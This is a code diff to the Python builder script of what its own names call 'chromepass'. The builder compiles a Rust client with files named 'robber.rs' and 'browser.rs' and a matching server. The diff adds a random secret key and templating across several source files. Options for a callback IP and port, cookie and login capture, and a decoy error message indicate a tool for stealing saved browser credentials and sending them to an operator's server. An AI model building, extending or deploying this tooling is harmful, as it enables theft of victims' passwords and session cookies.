@@ -14,8 +14,10 @@ import logging
 import subprocess
 import socket
 import argparse
+import random
 import shutil
 import os
+
 from _modules import setup
 config = configparser.ConfigParser()
 config.read("config.ini")
@@ -64,13 +66,21 @@ def stringify_bool(boolean):
     return str(boolean).lower()
 
 
-def script_replace(temp_path: str, replacement_map: dict, build_path: str):
-    with open(temp_path, "r") as f:
-        content = f.read()
+def get_file_content(filename: str):
+    return open(filename).read()
+
+
+def write_file_content(filename: str, data: str):
+    with open(filename, "w") as f:
+        f.write(data)
+
+
+def script_replace(temp_path: str, replacement_maps: dict, build_path: str, filenames: list):
+    for filename, replacement_map in zip(filenames, replacement_maps):
+        content = get_file_content(temp_path + filename)
         for key, val in replacement_map.items():
             content = content.replace(key, val)
-    with open(build_path, "w") as f:
-        f.write(content)
+        write_file_content(build_path + filename, content)
 
 
 def copy_after_compilation(src_path, dist_path, filename):
@@ -94,16 +104,29 @@ def copy_icon(src_path, dist_path, linux=False):
 def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool=False, error_message="None", cookies=False, login=False, port=80, nobuild=True):
     if nobuild:
         return True
-    replacement_map = {
-        "<<IP_ADDRESS>>": ip_address,
-        "<<ERROR_BOOL>>": stringify_bool(error_bool),
-        "<<ERROR_MESSAGE>>": error_message,
-        "<<COOKIES_BOOL>>": stringify_bool(cookies),
-        "<<LOGIN_BOOL>>": stringify_bool(login),
-        "<<PORT>>": str(port)
-    }
-    temp_path = f"{template_dir}/{filename}"
-    build_path = f"{template_dir}/{chromepass_base}/src/main.rs"
+    alphabet = "qwertyuiop[]asdfghjkl;'zxcvbnm,./"
+    secret_key = ''.join(random.choice(alphabet) for _ in range(32))
+    filenames = ["main.rs", "robber.rs", "browser.rs"]
+    replacement_maps = [
+        {
+            "<<IP_ADDRESS>>": ip_address,
+            "<<ERROR_BOOL>>": stringify_bool(error_bool),
+            "<<ERROR_MESSAGE>>": error_message,
+            "<<COOKIES_BOOL>>": stringify_bool(cookies),
+            "<<LOGIN_BOOL>>": stringify_bool(login),
+            "<<PORT>>": str(port),
+            "<<SECRET_KEY>>": secret_key
+        },
+        {
+            "<<SECRET_KEY>>": secret_key
+        },
+        {
+            "<<SECRET_KEY>>": secret_key
+        },
+    ]
+
+    temp_path = f"{template_dir}/client/"
+    build_path = f"{template_dir}/{chromepass_base}/src/"
     build_command = f"{refresh_env}cd {template_dir}\\{chromepass_base}; cargo build --release;"
     executable_name = "chromepass.exe"
     src_path = f"{template_dir}/{chromepass_base}/target/release/{executable_name}"
@@ -112,7 +135,7 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
         print("[+] Building Client")
         copy_icon(f"{icon_dir}/{icon}",
                   f"{template_dir}/{chromepass_base}/client.ico")
-        script_replace(temp_path, replacement_map, build_path)
+        script_replace(temp_path, replacement_maps, build_path, filenames)
         return compile_client(build_command, src_path, dist_path, "Client")
     print(f"[-] Error, file not found: {temp_path}")
     return False
@@ -121,12 +144,13 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
 def build_server(filename="server", icon="server.ico", port=80, nobuild=True, linux=False):
     if nobuild:
         return True
-    replacement_map = {
+    replacement_maps = [{
         "<<PORT>>": str(port)
-    }
-    temp_path = f"{template_dir}/{filename}"
-    build_path = f"{template_dir}/{chromepass_server}/src/main.rs"
-    script_replace(temp_path, replacement_map, build_path)
+    }]
+    filenames = ["main.rs"]
+    temp_path = f"{template_dir}/server/"
+    build_path = f"{template_dir}/{chromepass_server}/src/"
+    script_replace(temp_path, replacement_maps, build_path, filenames)
     build_command = f"{refresh_env}cd {template_dir}\\{chromepass_server}; cargo build --release;"
     executable_name = "release/chromepass-server.exe"
     dist_path = f"{dist_dir}/{filename}.exe"
